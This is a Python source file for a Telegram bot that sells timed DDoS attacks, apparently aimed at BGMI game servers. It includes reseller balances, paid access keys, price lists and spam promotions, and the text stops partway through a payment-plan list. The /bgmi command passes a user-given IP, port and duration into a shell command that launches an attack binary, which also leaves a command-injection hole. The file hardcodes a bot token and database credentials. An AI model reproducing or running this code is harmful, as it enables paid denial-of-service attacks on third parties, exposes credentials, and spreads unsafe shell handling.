from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime, timedelta
import subprocess
import time  # Import time for sleep functionalit
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from pymongo import MongoClient
import random 
import string

# Bot token
BOT_TOKEN = '7673464719:AAGiyohDI8kxmFE1cJUh_7eZ8zi_UFADu_U'  # Replace with your bot token

# Admin ID
ADMIN_ID = 1077368861

# Admin information
ADMIN_USERNAME = "Master Bhaiyaa"
ADMIN_CONTACT = "@MasterBhaiyaa "

# MongoDB Connection
MONGO_URL = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
client = MongoClient(MONGO_URL)

# Database and Collection
db = client["dake"]  # Database name
collection = db["Users"]  # Collection name
key_collection = db["Keys"]  # Collection for storing keys

# Dictionary to track recent attacks with a cooldown period
recent_attacks = {}

# Cooldown period in seconds
COOLDOWN_PERIOD = 1

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin = collection.find_one({"user_id": update.effective_user.id})
    
    # Check if the user is the Super Admin or a normal admin
    if update.effective_user.id != ADMIN_ID and (not admin or not admin.get("is_admin", False)):
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])  # ID of the user to approve
        duration = context.args[1]  # Duration with a unit (e.g., 1m, 2h, 3d)

        # Parse the duration
        duration_value = int(duration[:-1])  # Numeric part
        duration_unit = duration[-1].lower()  # Unit part (m = minutes, h = hours, d = days)

        # Calculate expiration time
        if duration_unit == "m":  # Minutes
            expiration_date = datetime.now() + timedelta(minutes=duration_value)
        elif duration_unit == "h":  # Hours
            expiration_date = datetime.now() + timedelta(hours=duration_value)
        elif duration_unit == "d":  # Days
            expiration_date = datetime.now() + timedelta(days=duration_value)
        else:
            await update.message.reply_text(
                "❌ *Invalid duration format. Use `m` for minutes, `h` for hours, or `d` for days.*",
                parse_mode="Markdown"
            )
            return

        # Super Admin logic: No balance deduction
        if update.effective_user.id == ADMIN_ID:
            collection.update_one(
                {"user_id": user_id},
                {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
                upsert=True
            )
            await update.message.reply_text(
                f"✅ *User {user_id} approved by Super Admin for {duration_value} "
                f"{'minute' if duration_unit == 'm' else 'hour' if duration_unit == 'h' else 'day'}(s).* \n"
                f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="Markdown"
            )

            # Notify approved user
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=(
                        f"🎉 *Congratulations!*\n"
                        f"✅ You have been approved for {duration_value} "
                        f"{'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}.\n"
                        f"⏳ *Your access will expire on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                        f"🚀 Enjoy using the bot!"
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Error notifying approved user {user_id}: {e}")
            return

        # Balance deduction for normal admins
        pricing = {
            1: 75,  # 1 day = ₹75
            3: 195,  # 3 days = ₹195
            7: 395,  # 7 days = ₹395
            30: 715  # 30 days = ₹715
        }
        price = pricing.get(duration_value) if duration_unit == "d" else None  # Pricing only applies for days

        if price is None:
            await update.message.reply_text(
                "❌ *Normal admins can only approve for fixed durations: 1, 3, 7, 30 days.*",
                parse_mode="Markdown"
            )
            return

        admin_balance = admin.get("balance", 0)
        if admin_balance < price:
            await update.message.reply_text("❌ *Insufficient balance to approve this user.*", parse_mode="Markdown")
            return

        # Deduct balance for normal admin
        collection.update_one(
            {"user_id": update.effective_user.id},
            {"$inc": {"balance": -price}}
        )

        # Approve the user
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} approved for {duration_value} days by Admin.*\n"
            f"💳 *₹{price} deducted from your balance.*\n"
            f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )

        # Notify approved user
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"🎉 *Congratulations!*\n"
                    f"✅ You have been approved for {duration_value} days.\n"
                    f"⏳ *Your access will expire on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                    f"🚀 Enjoy using the bot!"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"Error notifying approved user {user_id}: {e}")

    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /approve <user_id> <duration>*\n\n"
            "Example durations:\n\n"
            "1 Days = ₹75\n"
            "3 Days = ₹195\n"
            "7 Days = ₹395\n"
            "30 Days = ₹715\n",
            parse_mode="Markdown"
        )

from datetime import datetime, timedelta

async def notify_expiring_users(bot):
    while True:
        try:
            now = datetime.now()
            # Find users whose expiration is exactly 10 seconds from now
            expiring_soon_users = collection.find({
                "expiration_date": {"$gte": now, "$lte": now + timedelta(seconds=10)}
            })

            for user in expiring_soon_users:
                user_id = user.get("user_id")
                expiration_date = user.get("expiration_date")

                print(f"Notifying user {user_id} about expiration at {expiration_date}")  # Debug log

                try:
                    # Notify the user about their upcoming expiration
                    await bot.send_message(
                        chat_id=user_id,
                        text=(
                            "⚠️ *Your access is about to expire in 10 seconds!*\n"
                            "🔑 Please renew your access to continue using the bot."
                        ),
                        parse_mode="Markdown"
                    )
                    print(f"Notification sent to user {user_id}")  # Log success
                except Exception as e:
                    print(f"Error notifying user {user_id}: {e}")  # Log errors

        except Exception as main_error:
            print(f"Error in notify_expiring_users: {main_error}")

        await asyncio.sleep(5)  # Check every 5 seconds
        
# Remove a user from MongoDB
async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode='Markdown')
        return

    try:
        user_id = int(context.args[0])

        # Remove user from MongoDB
        result = collection.delete_one({"user_id": user_id})

        if result.deleted_count > 0:
            await update.message.reply_text(f"❌ *User {user_id} has been removed from the approved list.*", parse_mode='Markdown')
        else:
            await update.message.reply_text("🚫 *User not found in the approved list.*", parse_mode='Markdown')
    except IndexError:
        await update.message.reply_text("❌ *Usage: /remove <user_id>*", parse_mode='Markdown')

# Notifications List
notifications = [
    "🎉 *Exclusive Offer! Limited Time Only!*\n\n💫 *MasterBhaiyaa  ka bot ab working hai!* \n🔥 Get it now and enjoy premium features at the best price.\n\n📩 Contact @MasterBhaiyaa  to purchase the bot today!",
    "🚀 *100% Working Bot Available Now!*\n\n✨ Ab gaming aur tools ka maza lo bina kisi rukawat ke! \n💵 Affordable prices aur limited-time offers!\n\n👻 *Contact the owner now:* @MasterBhaiyaa ",
    "🔥 *Grab the Deal Now!* 🔥\n\n💎 MasterBhaiyaa  ke bot ka fayda uthaiye! \n✅ Full support, trusted service, aur unbeatable offers!\n\n👉 Message karo abhi: @MasterBhaiyaa ",
    "🎁 *Offer Alert!*\n\n🚀 Bot by MasterBhaiyaa  is now live and ready for purchase! \n💸 Limited-period deal hai, toh der na karein.\n\n📬 DM karo abhi: @MasterBhaiyaa ",
    "🌟 *Trusted Bot by MasterBhaiyaa * 🌟\n\n🎯 Working, trusted, aur power-packed bot ab available hai! \n✨ Features ka maza lo aur apna kaam easy banao.\n\n📞 DM for details: @MasterBhaiyaa ",
]

# Function to check if a user is approved
def is_user_approved(user_id):
    user = collection.find_one({"user_id": user_id})
    if user:
        expiration_date = user.get("expiration_date")
        if expiration_date and datetime.now() < expiration_date:
            return True
    return False

# Notify unapproved users daily
async def notify_unapproved_users(bot):
    while True:
        try:
            # Fetch all users from the database
            all_users = collection.find()

            for user in all_users:
                user_id = user.get("user_id")
                if not is_user_approved(user_id):  # Only notify unapproved users
                    notification = random.choice(notifications)  # Select a random notification
                    try:
                        await bot.send_message(
                            chat_id=user_id,
                            text=notification,
                            parse_mode="Markdown"
                        )
                        print(f"Notification sent to unapproved user {user_id}")
                    except Exception as e:
                        print(f"Error sending notification to user {user_id}: {e}")

            # Wait for 24 hours before sending the next notification
            await asyncio.sleep(24 * 60 * 60)

        except Exception as e:
            print(f"Error in notify_unapproved_users: {e}")
            await asyncio.sleep(60)  # Retry after 1 minute if there is an error

# Function to add spaced buttons to messages
def get_default_buttons():
    keyboard = [
        [InlineKeyboardButton("💖 JOIN OUR CHANNEL 💖", url="https://t.me/Team_Pro_Player")],
        [InlineKeyboardButton("👻 CONTACT OWNER 👻", url="https://t.me/MasterBhaiyaa")]
    ]
    return InlineKeyboardMarkup(keyboard)
    
async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        balance = int(context.args[1])

        # Add admin privileges and balance
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"is_admin": True, "balance": balance}},
            upsert=True
        )

        await update.message.reply_text(
            f"✅ *User {user_id} is now an admin with ₹{balance} balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addadmin <user_id> <balance>*",
            parse_mode="Markdown"
        )
        
async def addbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])

        # Add balance to the admin's account
        collection.update_one(
            {"user_id": user_id},
            {"$inc": {"balance": amount}}
        )

        await update.message.reply_text(
            f"✅ *₹{amount} added to Admin {user_id}'s balance.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /addbalance <user_id> <amount>*",
            parse_mode="Markdown"
        )
        
async def adminbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin = collection.find_one({"user_id": update.effective_user.id})
    if not admin or not admin.get("is_admin", False):
        await update.message.reply_text("🚫 *You are not an admin.*", parse_mode="Markdown")
        return

    balance = admin.get("balance", 0)
    await update.message.reply_text(f"💳 *Admin current balance is ₹{balance}.*", parse_mode="Markdown")

# Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_message = (
        f"👋 *Hello, {user.first_name}!*\n\n"
        "✨ *Welcome to the bot.*\n"
        "📜 *Type /help to see available commands.*\n\n"
        "💫 The owner of this bot is ❄️MasterBhaiyaa ❄️. Contact @MasterBhaiyaa ."
    )
    await update.message.reply_text(welcome_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = collection.find_one({"user_id": user.id})
    if user.id == ADMIN_ID:
        help_message = (
            "📜 *Super Admin Commands:*\n\n"
            "/approve - Approve users\n"
            "/addadmin - Add a reseller\n"
            "/addbalance - Add balance to an admin\n"
            "/remove - Remove a user\n"
            "/genkey - Generate keys\n"
            "/redeem - Redeem keys\n"
            "/adminbalance - Check balance\n"
            "/bgmi - Start attack\n"
            "/settime - Set attack time limit\n"
            "/setthread - Change thread settings\n"
            "/price - View prices\n"
            "/rule - View rules\n"
            "/owner - Contact owner\n"
            "/myinfo - View your info\n"
            "/removecoin - Remove coin\n"
            "/removeadmin - Remove admin\n"
            "/broadcast - Send Massage\n"
            "/users - See Users\n"
            "/uptime - See Bot Uptime\n"
            "/setcooldown - Set cooldown Time\n"
        )
    elif user_data and user_data.get("is_admin"):
        help_message = (
            "📜 *Admin Commands:*\n\n"
            "/genkey - Generate keys\n"
            "/redeem - Redeem keys\n"
            "/bgmi - Start attack\n"
            "/adminbalance - Check your balance\n"
            "/help - View commands\n"
        )
    else:
        help_message = (
            "📜 *User Commands:*\n\n"
            "/bgmi - Start attack\n"
            "/buy - FOR BUY DDOS BOT\n"
            "/rule - View rules\n"
            "/owner - Contact owner\n"
            "/myinfo - View your info\n"
            "/redeem - Redeem key\n"
            "/howtoattack - How To Attack\n"
            "/canary - Download Canary Android & Ios\n\n")

    await update.message.reply_text(help_message, parse_mode="Markdown")
    
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    admin_data = collection.find_one({"user_id": user_id})
    
    # Super Admin direct access
    if user_id == ADMIN_ID:
        is_super_admin = True
    else:
        is_super_admin = False

    # Normal Admin check
    if not is_super_admin and (not admin_data or not admin_data.get("is_admin")):
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        # Super Admin allows minutes/hours/days
        duration_input = context.args[0]  # e.g., "30m", "2h", "7d"
        duration_value = int(duration_input[:-1])  # Extract numeric part
        duration_unit = duration_input[-1].lower()  # Extract unit ('m', 'h', 'd')

        if not is_super_admin and duration_unit != "d":  # Normal Admin restriction
            await update.message.reply_text(
                "❌ *Normal admins can only generate keys for fixed days: 1, 3, 7, 30.*",
                parse_mode="Markdown"
            )
            return

        # Calculate duration in seconds
        if duration_unit == "m":  # Minutes
            duration_seconds = duration_value * 60
        elif duration_unit == "h":  # Hours
            duration_seconds = duration_value * 3600
        elif duration_unit == "d":  # Days
            duration_seconds = duration_value * 86400
        else:
            await update.message.reply_text("❌ *Invalid duration format. Use `m`, `h`, or `d`.*", parse_mode="Markdown")
            return

        # Pricing logic for Normal Admin
        pricing = {1: 75, 3: 195, 7: 395, 30: 715}  # Days-based pricing
        price = pricing.get(duration_value) if duration_unit == "d" else None

        if not is_super_admin:  # Normal Admin pricing logic
            if price is None:
                await update.message.reply_text(
                    "❌ *Invalid duration. Choose from: 1, 3, 7, 30 days.*",
                    parse_mode="Markdown"
                )
                return

            balance = admin_data.get("balance", 0)
            if balance < price:
                await update.message.reply_text(
                    f"❌ *Insufficient balance!*\n💳 Current Balance: ₹{balance}\n💰 Required: ₹{price}",
                    parse_mode="Markdown"
                )
                return
            # Deduct balance
            collection.update_one({"user_id": user_id}, {"$inc": {"balance": -price}})
        
        # Generate random key
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

        # Save key to database
        key_collection.insert_one({
            "key": key,
            "duration_seconds": duration_seconds,
            "generated_by": user_id,
            "is_redeemed": False
        })

        await update.message.reply_text(
            f"✅ *Key Generated Successfully!*\n🔑 Key: `{key}`\n⏳ Validity: {duration_value} {'minute(s)' if duration_unit == 'm' else 'hour(s)' if duration_unit == 'h' else 'day(s)'}\n💳 Cost: ₹{price if not is_super_admin else 'Free'}",
            parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /gen <duration>*\n\n"
            "📑Examples:\n"
            "1 Day = ₹75\n3 Days = ₹195\n7 Days = ₹395\n30 Days = ₹715\n\n"
            "/𝙜𝙚𝙣 1𝙙 <-- 𝘼𝙖𝙞𝙨𝙚 𝘿𝙖𝙡𝙤 𝙆𝙚𝙮 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚 𝙆𝙖𝙧𝙣𝙚 𝙆𝙚 𝙇𝙞𝙮𝙚",
            parse_mode="Markdown"
        )
        
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        key = context.args[0]  # Key to redeem
        key_data = key_collection.find_one({"key": key, "is_redeemed": False})

        if not key_data:
            await update.message.reply_text("❌ *Invalid or already redeemed key.*", parse_mode="Markdown")
            return

        # Calculate expiration date
        duration_seconds = key_data["duration_seconds"]
        expiration_date = datetime.now() + timedelta(seconds=duration_seconds)

        # Update user expiration date
        collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
            upsert=True
        )

        # Mark key as redeemed
        key_collection.update_one({"key": key}, {"$set": {"is_redeemed": True}})

        await update.message.reply_text(
            f"✅ *Key Redeemed Successfully!*\n🔑 Key: `{key}`\n⏳ Access Expires: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )
    except IndexError:
        await update.message.reply_text(
            "❌ *Usage: /redeem <key>*",
            parse_mode="Markdown"
        )
        
async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])

        # Remove admin privileges
        collection.update_one(
            {"user_id": user_id},
            {"$unset": {"is_admin": "", "balance": ""}}
        )

        await update.message.reply_text(
            f"✅ *User {user_id} is no longer an admin.*", parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /removeadmin <user_id>*",
            parse_mode="Markdown"
        )
        
async def removecoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])

        # Deduct balance
        admin_data = collection.find_one({"user_id": user_id})
        if not admin_data or not admin_data.get("is_admin", False):
            await update.message.reply_text(
                "❌ *The specified user is not an admin.*", parse_mode="Markdown"
            )
            return

        current_balance = admin_data.get("balance", 0)
        if current_balance < amount:
            await update.message.reply_text(
                "❌ *Insufficient balance to deduct.*", parse_mode="Markdown"
            )
            return

        collection.update_one(
            {"user_id": user_id},
            {"$inc": {"balance": -amount}}
        )

        await update.message.reply_text(
            f"✅ *₹{amount} deducted from Admin {user_id}'s balance.*",
            parse_mode="Markdown"
        )
    except (IndexError, ValueError):
        await update.message.reply_text(
            "❌ *Usage: /removecoin <user_id> <amount>*",
            parse_mode="Markdown"
        )

from datetime import datetime, timedelta
import asyncio
import subprocess

# Global variables to track current attack
current_attack_user = None  # Tracks the current user attacking
current_attack_end_time = None  # Tracks when the current attack will end

# Global variable for attack time limit (default: 240 seconds)
attack_time_limit = 240

# Command to set the attack limit dynamically
async def set_attack_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        new_limit = int(context.args[0])  # New attack limit in seconds
        if new_limit < 1:
            await update.message.reply_text("⚠️ *Invalid limit. Please enter a value greater than 0.*", parse_mode="Markdown")
            return
        global attack_time_limit
        attack_time_limit = new_limit  # Update global attack time limit
        await update.message.reply_text(f"✅ *Attack time limit has been updated to {new_limit} seconds.*", parse_mode="Markdown")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ *Usage: /setattacklimit <duration_in_seconds>*", parse_mode="Markdown")

import asyncio
from datetime import datetime, timedelta

import asyncio
from datetime import datetime, timedelta

import asyncio
from datetime import datetime, timedelta

attack_cooldown = {}  # {user_id: cooldown_end_time}
COOLDOWN_PERIOD = 1  # Default cooldown = 10 minutes

async def update_attack_timer(context, chat_id, message_id, start_time, duration, ip, port, user_name, user_id):
    while True:
        remaining_time = int((start_time + timedelta(seconds=duration) - datetime.now()).total_seconds())
        if remaining_time <= 0:
            break
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"🚀 *ATTACK IN PROGRESS*\n"
                     f"🌐 *IP:* {ip}\n"
                     f"🎯 *PORT:* {port}\n"
                     f"👤 *User:* {user_name} (ID: {user_id})\n\n"
                     f"⏳ *Remaining Time:* {remaining_time} seconds\n\n"
                     "⚠️ Please wait...",
                parse_mode="Markdown"
            )
        except:
            break
        await asyncio.sleep(1)

async def set_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to update cooldown period dynamically."""
    global COOLDOWN_PERIOD

    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to change cooldown.*", parse_mode="Markdown")
        return

    try:
        new_cooldown = int(context.args[0])
        if new_cooldown < 0:
            await update.message.reply_text("⚠️ *Cooldown time must be 0 or greater.*", parse_mode="Markdown")
            return

        COOLDOWN_PERIOD = new_cooldown
        await update.message.reply_text(f"✅ *Cooldown period updated to {new_cooldown} seconds.*", parse_mode="Markdown")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ *Usage: /setcooldown <seconds>*", parse_mode="Markdown")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack_user, current_attack_end_time, attack_cooldown

    user_id = update.effective_user.id
    user_name = update.effective_user.first_name

    if not is_user_approved(user_id):
        await update.message.reply_text(
            "🚫 *You are not authorized to use this command.*\n"
            "💬 *Please contact the admin if you believe this is an error.*",
            parse_mode="Markdown",
        )
        return

    if current_attack_user is not None:
        remaining_time = (current_attack_end_time - datetime.now()).total_seconds()
        if remaining_time > 0:
            await update.message.reply_text(
                f"⚠️ *Another attack is currently in progress!*\n"
                f"👤 *Attacking User ID:* {current_attack_user}\n"
                f"⏳ *Remaining Time:* {int(remaining_time)} seconds.\n\n"
                "🚀 Please wait for the current attack to finish.",
                parse_mode="Markdown",
            )
            return
        else:
            current_attack_user = None
            current_attack_end_time = None

    if len(context.args) != 3:
        await update.message.reply_text("⚠️ *Usage:* /bgmi <ip> <port> <duration>", parse_mode="Markdown")
        return

    ip = context.args[0]
    port = context.args[1]
    try:
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ *Invalid duration.*", parse_mode="Markdown")
        return

    if port in ["20001", "20002", "17500", "20000"] or len(port) == 3:
        await update.message.reply_text(f"🚫 *Port {port} is not allowed.*", parse_mode="Markdown")
        return

    if duration > attack_time_limit:
        await update.message.reply_text(f"⚠️ *Max attack time is {attack_time_limit} seconds.*", parse_mode="Markdown")
        return

    if user_id in attack_cooldown:
        remaining_time = (attack_cooldown[user_id] - datetime.now()).total_seconds()
        if remaining_time > 0:
            await update.message.reply_text(
                f"⏳ *You must wait {int(remaining_time)} seconds before starting another attack!*",
                parse_mode="Markdown",
            )
            return

    attack_cooldown[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_PERIOD)

    current_attack_user = user_id
    current_attack_end_time = datetime.now() + timedelta(seconds=duration)

    # Pehle message bhejke uska ID lete hain, fir usko edit karenge
    message = await update.message.reply_text("🚀 *Starting Attack...*", parse_mode="Markdown")

    # Start live countdown
    asyncio.create_task(update_attack_timer(
        context, update.message.chat_id, message.message_id, datetime.now(), duration, ip, port, user_name, user_id
    ))
    asyncio.create_task(run_attack(ip, port, duration, update, user_id))
    
async def run_attack(ip, port, duration, update, user_id):
    global current_attack_user, current_attack_end_time, attack_cooldown

    try:
        command = f"./MasterBhaiyaa {ip} {port} {duration} "
        process = subprocess.Popen(command, shell=True)

        await asyncio.sleep(duration)

        process.terminate()
        process.wait()

        # Reset attack state
        current_attack_user = None
        current_attack_end_time = None

        # Send attack finished message
        await update.message.reply_text(
            f"✅ *ATTACK FINISHED*\n"
            f"🌐 *IP:* {ip}\n"
            f"🎯 *PORT:* {port}\n"
            f"⏳ *DURATION:* {duration} seconds\n"
            f"👤 *User ID:* {user_id}\n\n"
            "💫 The owner of this bot is ❄️MasterBhaiyaa ❄️. Contact @MasterBhaiyaa .",
            parse_mode="Markdown",
        )

    except Exception as e:
        print(f"Error in run_attack: {e}")
        await update.message.reply_text(f"⚠️ *Attack Error:* {str(e)}", parse_mode="Markdown")
    
# Default thread value
default_thread = "900"

# Command to set thread dynamically
async def set_thread(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    try:
        global default_thread
        new_thread = context.args[0]
        if not new_thread.isdigit():
            await update.message.reply_text("❌ *Invalid thread value. Please provide a numeric value.*", parse_mode="Markdown")
            return

        default_thread = new_thread  # Update the default thread value
        await update.message.reply_text(f"✅ *Thread value updated to {default_thread}.*", parse_mode="Markdown")
    except IndexError:
        await update.message.reply_text("❌ *Usage: /setthread <thread_value>*", parse_mode="Markdown")

# Command for /howtoattack
async def howtoattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Learn How to Attack:*\n"
        f"[Watch the Tutorial](https://t.me/c/2423544768/5)",
        parse_mode="Markdown"
    )

# Command for /canary
async def canary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱Android Canary📱", url="https://t.me/c/2166087903/2998")],
        [InlineKeyboardButton("🍎iOS Canary🍎", url="https://apps.apple.com/in/app/surge-5/id1442620678")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🛠️ *Choose your platform to download the Canary version:*",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
            
async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    price_message = (
        "💰 *PRICE LIST:*\n\n"
        "⭐ 1 Day = ₹115\n"
        "⭐ 3 Days = ₹295\n"
        "⭐ 1 Week = ₹525\n"
        "⭐ 1 Month = ₹995\n"
        "⭐ Lifetime = ₹1,585\n\n"
        "💫 The owner of this bot is ❄️MasterBhaiyaa ❄️. Contact @MasterBhaiyaa ."
    )
    await update.message.reply_text(price_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def rule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rule_message = "⚠️ *Rule: Ek Time Pe Ek Hi Attack Lagana*\n\n💫 The owner of this bot is ❄️MasterBhaiyaa ❄️. Contact @MasterBhaiyaa ."
    await update.message.reply_text(rule_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👤 *The owner of this bot is {ADMIN_USERNAME}.*\n"
        f"✉️ *Contact:* {ADMIN_CONTACT}\n\n", parse_mode='Markdown'
    )

import asyncio

async def update_myinfo_timer(context, chat_id, message_id, user):
    while True:
        user_data = collection.find_one({"user_id": user.id})
        now = datetime.now()

        if user_data and "expiration_date" in user_data:
            expiration_date = user_data["expiration_date"]

            # Convert expiration date to IST
            ist_expiration = expiration_date + timedelta(hours=5, minutes=30)
            ist_now = now + timedelta(hours=5, minutes=30)
            time_left = ist_expiration - ist_now
            days, seconds = time_left.days, time_left.seconds
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            seconds = seconds % 60

            if expiration_date < now:
                expiration_info = (
                    f"❌ *Your access has expired.*\n"
                    f"⏳ *Expired On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}"
                )
                break  # Expired ho gaya, toh update band kar do
            else:
                expiration_info = (
                    f"⏳ *Access Expires On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"⌛ *Time Left:* {days} days, {hours} hours, {minutes} minutes, {seconds} seconds\n\n"
                    "⚡ *Live updating...*"
                )
        else:
            expiration_info = "❌ *You have never been approved.*"
            break  # Agar approved hi nahi hai toh update band

        info_message = (
            "📝 *Your Information:*\n"
            f"🔗 *Username:* @{user.username if user.username else 'N/A'}\n"
            f"🆔 *User ID:* {user.id}\n"
            f"👤 *First Name:* {user.first_name}\n"
            f"👥 *Last Name:* {user.last_name if user.last_name else 'N/A'}\n\n"
            f"{expiration_info}"
        )

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=info_message,
                parse_mode="Markdown"
            )
        except:
            break

        await asyncio.sleep(1)  # Har second update karega

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = await update.message.reply_text("📝 *Fetching your info...*", parse_mode="Markdown")

    # Start live updating countdown
    asyncio.create_task(update_myinfo_timer(context, update.message.chat_id, message.message_id, user))

async def admincommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await not_authorized_message(update)
        return

    admin_message = (
        "🔧 *Admin-only commands:*\n"
        "/approve - Add user\n"
        "/remove - Remove user\n"
        "/settime - Set Attack Time\n"
        "/setthread - Thread Changing\n"
        "/addbalance - Add Admin Balance\n"
        "/addadmin - Add Reseller\n"
        "💫 The owner of this bot is ❄️MasterBhaiyaa ❄️. Contact @MasterBhaiyaa ."
    )
    await update.message.reply_text(admin_message, parse_mode='Markdown')
    
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    if not context.args:
        await update.message.reply_text("❌ *Usage: /broadcast <message>*", parse_mode="Markdown")
        return

    message = " ".join(context.args)
    users = collection.find({"expiration_date": {"$gte": datetime.now()}})

    success_count = 0
    for user in users:
        try:
            await context.bot.send_message(chat_id=user["user_id"], text=message, parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            print(f"Failed to send message to {user['user_id']}: {e}")

    await update.message.reply_text(f"✅ *Broadcast sent to {success_count} users.*", parse_mode="Markdown")
    
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    users = collection.find({"expiration_date": {"$gte": datetime.now()}})
    user_list = "\n".join([f"🆔 {user['user_id']} - Expires: {user['expiration_date'].strftime('%Y-%m-%d %H:%M:%S')}" for user in users])

    if not user_list:
        user_list = "⚠️ *No active users found.*"

    await update.message.reply_text(f"📋 *Approved Users:*\n\n{user_list}", parse_mode="Markdown")
    
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
)

QR_IMAGE_PATH = "payment_qr_code.png"  # Scanner QR file ka path

plans = [
    ("₹150 = 1 DAY ✅", "150"),
